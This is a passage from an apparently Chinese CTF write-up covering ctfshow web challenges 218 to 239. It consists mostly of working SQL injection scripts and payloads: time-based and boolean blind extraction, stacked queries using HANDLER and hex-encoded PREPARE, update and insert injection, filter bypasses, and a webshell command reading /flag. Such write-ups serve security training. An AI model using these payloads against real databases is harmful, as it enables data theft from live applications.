    <span class="token keyword">while</span> <span class="token punctuation">(</span>head <span class="token operator">&lt;</span> tail<span class="token punctuation">)</span><span class="token punctuation">:</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>
        mid <span class="token operator">=</span> head <span class="token operator">+</span> tail <span class="token operator">&gt;&gt;</span> <span class="token number">1</span>
        payload <span class="token operator">=</span> <span class="token string">"1) or if(ascii(mid((select group_concat(flagaabc) from ctfshow_flagxccb),%d,1))&gt;%d,benchmark(3145140,md5(2333)),0)#"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> mid<span class="token punctuation">)</span>
        data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">'ip'</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span>
            <span class="token string">'debug'</span><span class="token punctuation">:</span><span class="token number">0</span>
        <span class="token punctuation">}</span>
        time1 <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        time2 <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>time2<span class="token operator">-</span>time1<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0.5</span><span class="token punctuation">:</span>
            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            tail <span class="token operator">=</span> mid
    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
        name <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">ascii</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">continue</span>
</code></pre> 
<h2><a id="web_218_1109"></a>web 218</h2> 
<p>你大爷还是你大爷，benchmark 过滤了。</p> 
<p><img src="https://images2.imgbox.com/9c/b1/Ly3nrepw_o.png" alt="在这里插入图片描述"></p> 
<p><a href="https://www.cnblogs.com/forforever/p/13019703.html" rel="nofollow">mysql 五种时间盲注</a><br> <img src="https://images2.imgbox.com/6e/e0/zwigD5Hy_o.png" alt="在这里插入图片描述"><br> RLIKE REGEXP 正则匹配时间盲注：</p> 
<pre><code class="prism language-php">import requests
import time

url <span class="token operator">=</span> <span class="token string double-quoted-string">"http://1498ea8e-04d8-4b20-8b35-92a724105912.challenge.ctf.show/api/index.php"</span>

name <span class="token operator">=</span> <span class="token string double-quoted-string">""</span>
i <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">while</span> <span class="token constant boolean">True</span><span class="token punctuation">:</span>
    head <span class="token operator">=</span> <span class="token number">32</span>
    tail <span class="token operator">=</span> <span class="token number">127</span>
    i <span class="token operator">+=</span> <span class="token number">1</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>head <span class="token operator">&lt;</span> tail<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token class-name return-type">time</span><span class="token operator">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>
        mid <span class="token operator">=</span> head <span class="token operator">+</span> tail <span class="token operator">&gt;&gt;</span> <span class="token number">1</span>
        sleep_rep <span class="token operator">=</span> <span class="token string double-quoted-string">"concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) rlike '(a.*)+(a.*)+b'"</span>
        payload <span class="token operator">=</span> <span class="token string double-quoted-string">"1) or if(ascii(mid((select group_concat(flagaac) from ctfshow_flagxc),%d,1))&gt;%d,%s,0)#"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> mid<span class="token punctuation">,</span> sleep_rep<span class="token punctuation">)</span>
        data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string single-quoted-string">'ip'</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'debug'</span><span class="token punctuation">:</span><span class="token number">0</span>
        <span class="token punctuation">}</span>
        time1 <span class="token operator">=</span> time<span class="token operator">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        r <span class="token operator">=</span> requests<span class="token operator">.</span><span class="token function">post</span><span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        time2 <span class="token operator">=</span> time<span class="token operator">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>time2<span class="token operator">-</span>time1<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0.5</span><span class="token punctuation">:</span>
            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            tail <span class="token operator">=</span> mid
    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
        name <span class="token operator">+=</span> <span class="token function">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token function">ascii</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">continue</span>
</code></pre> 
<h2><a id="web_219_1151"></a>web 219</h2> 
<p><img src="https://images2.imgbox.com/75/fe/AKgdMUoY_o.png" alt="在这里插入图片描述"><br> 用笛卡尔积：</p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time

url <span class="token operator">=</span> <span class="token string">"http://cc0d5d16-c6b3-4672-8955-b7134f2d6cc5.challenge.ctf.show/api/index.php"</span>

name <span class="token operator">=</span> <span class="token string">""</span>
i <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    head <span class="token operator">=</span> <span class="token number">32</span>
    tail <span class="token operator">=</span> <span class="token number">127</span>
    i <span class="token operator">+=</span> <span class="token number">1</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>head <span class="token operator">&lt;</span> tail<span class="token punctuation">)</span><span class="token punctuation">:</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>
        mid <span class="token operator">=</span> head <span class="token operator">+</span> tail <span class="token operator">&gt;&gt;</span> <span class="token number">1</span>
        sleep_rep <span class="token operator">=</span> <span class="token string">"(SELECT count(*) FROM information_schema.columns A, information_schema.columns B)"</span>
        payload <span class="token operator">=</span> <span class="token string">"1) or if(ascii(mid((select flagaabc from ctfshow_flagxca),%d,1))&gt;%d,%s,0)#"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> mid<span class="token punctuation">,</span> sleep_rep<span class="token punctuation">)</span>
        data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">'ip'</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span>
            <span class="token string">'debug'</span><span class="token punctuation">:</span><span class="token number">0</span>
        <span class="token punctuation">}</span>
        time1 <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        time2 <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>time2<span class="token operator">-</span>time1<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0.15</span><span class="token punctuation">:</span>
            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            tail <span class="token operator">=</span> mid
    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
        name <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">ascii</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">continue</span>
</code></pre> 
<h2><a id="web_220_1190"></a>web 220</h2> 
<p><img src="https://images2.imgbox.com/2c/b5/bM4jfKan_o.png" alt="在这里插入图片描述"></p> 
<pre><code>import requests
url = "http://ab655d78-6741-4e26-ba76-fdb92bb854b6.challenge.ctf.show/api/"

strr = "qazwsxedcrfvtgbyhnujmikolp-_1234567890{}"
payload = "select flagaabcc from ctfshow_flagxcac"
j = 1
flag = ""
while 1:
    for i in strr:
        flag += i
        data = {
            'ip': f"1) or if(left(({payload}),{j})='{flag}',(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),1",
            'debug': '1'
        }
        try:
            r = requests.post(url, data=data, timeout=0.15)
            flag = flag[:-1]
        except Exception as e:
            print(flag)
            j+=1


</code></pre> 
<h2><a id="web_221_1217"></a>web 221</h2> 
<p><img src="https://images2.imgbox.com/6a/f3/qmITHAFy_o.png" alt="在这里插入图片描述"><br> 使用 <code>PROCEDURE</code>函数进行注入</p> 
<pre><code class="prism language-php">page<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>limit<span class="token operator">=</span><span class="token number">1</span> procedure <span class="token function">analyse</span><span class="token punctuation">(</span><span class="token function">extractvalue</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>
</code></pre> 
<p>如果这题没有回显，可以用时间盲注</p> 
<pre><code class="prism language-php"><span class="token function">BENCHMARK</span><span class="token punctuation">(</span><span class="token number">5000000</span><span class="token punctuation">,</span><span class="token function">SHA1</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
</code></pre> 
<p><a href="https://www.jianshu.com/p/6c1420a7a7d9" rel="nofollow">limit 注入详解</a></p> 
<h2><a id="web_222_1230"></a>web 222</h2> 
<p><img src="https://images2.imgbox.com/1e/94/MzzOmh7H_o.png" alt="在这里插入图片描述"></p> 
<p><a href="https://www.secpulse.com/archives/140616.html" rel="nofollow">group 注入详解</a></p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time

url <span class="token operator">=</span> <span class="token string">"http://cdd4496e-a471-4cc7-b964-170ee2b17222.challenge.ctf.show/api/index.php"</span>

name <span class="token operator">=</span> <span class="token string">""</span>
i <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    head <span class="token operator">=</span> <span class="token number">32</span>
    tail <span class="token operator">=</span> <span class="token number">127</span>
    i <span class="token operator">+=</span> <span class="token number">1</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>head <span class="token operator">&lt;</span> tail<span class="token punctuation">)</span><span class="token punctuation">:</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>
        mid <span class="token operator">=</span> head <span class="token operator">+</span> tail <span class="token operator">&gt;&gt;</span> <span class="token number">1</span>
        payload <span class="token operator">=</span> <span class="token string">"select flagaabc from ctfshow_flaga"</span>
        params <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">'u'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"concat((if (ascii(substr((</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>payload<span class="token punctuation">}</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>i<span class="token punctuation">}</span></span><span class="token string">,1))&gt;</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>mid<span class="token punctuation">}</span></span><span class="token string">, sleep(0.05), 2)), floor(rand(0)*2));"</span></span>

        <span class="token punctuation">}</span>
        time1 <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">)</span>
        time2 <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>time2<span class="token operator">-</span>time1<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">1.05</span><span class="token punctuation">:</span>
            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            tail <span class="token operator">=</span> mid
    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
        name <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">ascii</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">continue</span>
</code></pre> 
<h2><a id="web_223_1269"></a>web 223</h2> 
<p>可以布尔盲注，过滤了数字，用 true 代替</p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> requests
url <span class="token operator">=</span> <span class="token string">'http://1d2b781a-444e-47fe-941d-201e33b77438.challenge.ctf.show/api/index.php'</span>
word <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyz0123456789-{}'</span>
flag <span class="token operator">=</span> <span class="token string">''</span>

<span class="token keyword">def</span> <span class="token function">generateNum</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
    res <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
        res <span class="token operator">+=</span> <span class="token string">"true+"</span>
    <span class="token keyword">return</span> res<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>


<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> word<span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token string">"select flagasabc from ctfshow_flagas"</span>
        final_payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>payload<span class="token punctuation">}</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>generateNum<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">,true))=(</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>generateNum<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">),username,'a')"</span></span>
        params <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">"u"</span><span class="token punctuation">:</span> final_payload
        <span class="token punctuation">}</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>final_payload<span class="token punctuation">)</span>
        req <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>params<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">'userAUTO'</span> <span class="token keyword">in</span> req<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> j
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
</code></pre> 
<h2><a id="web_224_1299"></a>web 224</h2> 
<p>扫目录，有robots.txt，pwdreset.php 可以重置密码<br> <img src="https://images2.imgbox.com/1e/15/iNTsCRUI_o.png" alt="在这里插入图片描述"><br> 然后下载群里的 payload.bin 上传</p> 
<p>然后1.php?1=cat /flag就可以了</p> 
<h2><a id="web_225_1306"></a>web 225</h2> 
<h3><a id="handle_1307"></a>利用handle</h3> 
<pre><code>api/?username=';show tables;#
</code></pre> 
<pre><code class="prism language-php">mysql<span class="token operator">&gt;</span> handler users open<span class="token punctuation">;</span>handler users read first<span class="token punctuation">;</span>
Query <span class="token constant">OK</span><span class="token punctuation">,</span> <span class="token number">0</span> rows <span class="token function">affected</span> <span class="token punctuation">(</span><span class="token number">0.01</span> sec<span class="token punctuation">)</span>
<span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span>
<span class="token operator">|</span> <span class="token class-name">id</span> <span class="token operator">|</span> <span class="token class-name">username</span> <span class="token operator">|</span> <span class="token class-name">password</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span>
<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> <span class="token class-name">admin</span>    <span class="token operator">|</span>     <span class="token number">1232</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span>
<span class="token number">1</span> row in <span class="token function">set</span> <span class="token punctuation">(</span><span class="token number">0.02</span> sec<span class="token punctuation">)</span>
</code></pre> 
<pre><code class="prism language-php">api<span class="token operator">/</span><span class="token operator">?</span>username<span class="token operator">=</span>'<span class="token punctuation">;</span>handler ctfshow_flagasa open<span class="token punctuation">;</span>handler ctfshow_flagasa read first<span class="token punctuation">;</span>
</code></pre> 
<h3><a id="_1328"></a>利用预处理</h3> 
<pre><code>api/?username=0';prepare a from concat('s','elect',' flagas from ctfshow_flagasa');execute a;
</code></pre> 
<h2><a id="web_226_1333"></a>web 226</h2> 
<p>过滤了有括号，用 16 进制绕过</p> 
<pre><code class="prism language-php">api<span class="token operator">/</span><span class="token operator">?</span>username<span class="token operator">=</span>'<span class="token punctuation">;</span>prepare a from <span class="token number">0x73656c656374202a2066726f6d2063746673685f6f775f666c61676173</span><span class="token punctuation">;</span>execute a<span class="token punctuation">;</span><span class="token comment">#</span>
</code></pre> 
<h2><a id="web_227_1339"></a>web 227</h2> 
<pre><code>api/?username=';PREPARE a from 0x73656c656374202a2066726f6d20696e666f726d6174696f6e5f736368656d612e726f7574696e6573;EXECUTE a;
</code></pre> 
<h2><a id="web228229230_1344"></a>web228、229、230</h2> 
<pre><code>web228
?username=';PREPARE a from 0x73656c656374202a2066726f6d2063746673685f6f775f666c616761736161;EXECUTE a;

web229
?username=';PREPARE a from 0x73656c656374202a2066726f6d20666c6167;EXECUTE a;

web230
?username=';PREPARE a from 0x73656c656374202a2066726f6d20666c61676161626278;EXECUTE a;
</code></pre> 
<h2><a id="web_231_1356"></a>web 231</h2> 
<p>update 替换字段值</p> 
<pre><code>查表名
password=1',username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where 1=1#&amp;username=1
查列名
password=1',username=(select group_concat(column_name) from information_schema.columns where table_name='flaga') where 1=1#&amp;username=1
得到flag
password=1',username=(select flagas from flaga) where 1=1#&amp;username=1
</code></pre> 
<h2><a id="web_232_1366"></a>web 232</h2> 
<pre><code class="prism language-php"><span class="token comment">//分页查询</span>
  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"update ctfshow_user set pass = md5('<span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$password</span><span class="token punctuation">}</span></span>') where username = '<span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$username</span><span class="token punctuation">}</span></span>';"</span><span class="token punctuation">;</span>
</code></pre> 
<p>在上一题的基础上加个闭合就行了<br> <img src="https://images2.imgbox.com/9b/86/brq8r1Bd_o.png" alt="在这里插入图片描述"><br> payload：</p> 
<pre><code class="prism language-php">password<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">)</span><span class="token punctuation">,</span>username<span class="token operator">=</span><span class="token punctuation">(</span>select flagass from flagaa<span class="token punctuation">)</span> where <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment">#&amp;username=1</span>
</code></pre> 
<h2><a id="web_233_1380"></a>web 233</h2> 
<p>无回显，盲注即可</p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time

url <span class="token operator">=</span> <span class="token string">"http://20eb92e9-e637-4327-985b-89811ff6cde8.challenge.ctf.show/api/?page=1&amp;limit=10"</span>

name <span class="token operator">=</span> <span class="token string">""</span>
i <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    head <span class="token operator">=</span> <span class="token number">32</span>
    tail <span class="token operator">=</span> <span class="token number">127</span>
    i <span class="token operator">+=</span> <span class="token number">1</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>head <span class="token operator">&lt;</span> tail<span class="token punctuation">)</span><span class="token punctuation">:</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>
        mid <span class="token operator">=</span> head <span class="token operator">+</span> tail <span class="token operator">&gt;&gt;</span> <span class="token number">1</span>
        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"' or if(ascii(substr((select group_concat(flagass233) from flag233333),</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>i<span class="token punctuation">}</span></span><span class="token string">,1))&lt;</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>mid<span class="token punctuation">}</span></span><span class="token string">,sleep(0.05),1)#"</span></span>
        data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">'password'</span><span class="token punctuation">:</span><span class="token string">'1'</span><span class="token punctuation">,</span>
            <span class="token string">'username'</span><span class="token punctuation">:</span>payload

        <span class="token punctuation">}</span>
        time1 <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        time2 <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>time2<span class="token operator">-</span>time1<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">1.05</span><span class="token punctuation">:</span>
            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            tail <span class="token operator">=</span> mid
    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
        name <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">continue</span>
</code></pre> 
<h2><a id="web_234_1416"></a>web 234</h2> 
<p>y4 大师傅说过滤了单引号，可以用 \ 逃逸出来</p> 
<pre><code>update ctfshow_user set pass = '{$password}' where username = '{$username}';
update ctfshow_user set pass = ' \' where username = '{$username}';
这样 pass 的内容就是 ' where username = '，username 处我们就可以控制了。
</code></pre> 
<p>payload:</p> 
<pre><code>password=\&amp;username=,username=(select group_concat(table_name) from information_schema.tables where table_schema=database())#
password=\&amp;username=,username=(select group_concat(column_name) from information_schema.columns where table_name=0x666c6167323361)#
password=\&amp;username=,username=(select flagass23s3 from flag23a)#
</code></pre> 
<h2><a id="web_235_1432"></a>web 235</h2> 
<p>过滤了 or ，那么 information 就用不起来了，可以用 mysql.innodb_table_stats 代替</p> 
<pre><code class="prism language-php">password<span class="token operator">=</span>\<span class="token operator">&amp;</span>username<span class="token operator">=</span><span class="token punctuation">,</span>username<span class="token operator">=</span><span class="token punctuation">(</span>select <span class="token function">group_concat</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from mysql<span class="token operator">.</span>innodb_table_stats where database_name<span class="token operator">=</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#</span>
</code></pre> 
<p>然后用无列名注入</p> 
<pre><code class="prism language-php">password<span class="token operator">=</span>\<span class="token operator">&amp;</span>username<span class="token operator">=</span><span class="token punctuation">,</span>username<span class="token operator">=</span><span class="token punctuation">(</span>select <span class="token function">group_concat</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token function">from</span> <span class="token punctuation">(</span>select <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span> <span class="token keyword">as</span> b<span class="token punctuation">,</span><span class="token number">3</span> union select <span class="token operator">*</span> from flag23a1<span class="token punctuation">)</span>a<span class="token punctuation">)</span><span class="token comment">#</span>
</code></pre> 
<h2><a id="web__236_1444"></a>web 236</h2> 
<p>感觉过滤了个寂寞，flag 照样能用</p> 
<pre><code>password=\&amp;username=,username=(select group_concat(b) from (select 1,2 as b,3 union select * from flaga )a)#
</code></pre> 
<h2><a id="web_237_1450"></a>web 237</h2> 
<p>insert 注入，原理和 update 注入一样，闭合逃逸补全</p> 
<pre><code class="prism language-php"><span class="token string single-quoted-string">',(select group_concat(table_name) from information_schema.tables where table_schema=database()));#&amp;password=1
'</span><span class="token punctuation">,</span><span class="token punctuation">(</span>select <span class="token function">group_concat</span><span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> from information_schema<span class="token operator">.</span>columns where table_name<span class="token operator">=</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#&amp;password=1</span>
'<span class="token punctuation">,</span><span class="token punctuation">(</span>select <span class="token function">group_concat</span><span class="token punctuation">(</span>flagass23s3<span class="token punctuation">)</span> from flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#&amp;password=1</span>
</code></pre> 
<h2><a id="web_238_1458"></a>web 238</h2> 
<p>过滤了空格，可以用括号代替<br> <code>username=',(select(group_concat(flag))from(flagb)));#&amp;password=1</code></p> 
<h2><a id="web_239_1462"></a>web 239</h2> 
<p>过滤了空格，和 or，和 235 题一样用 mysql.innodb_table_stats</p> 
<pre><code class="prism language-php">username<span class="token operator">=</span>'<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token function">group_concat</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">from</span><span class="token punctuation">(</span>mysql<span class="token operator">.</span>innodb_table_stats<span class="token punctuation">)</span><span class="token function">where</span><span class="token punctuation">(</span>database_name<span class="token operator">=</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#&amp;password=1</span>
</code></pre> 
<p>这边不知道又偷偷过滤了啥，无列名注入不起来</p> 
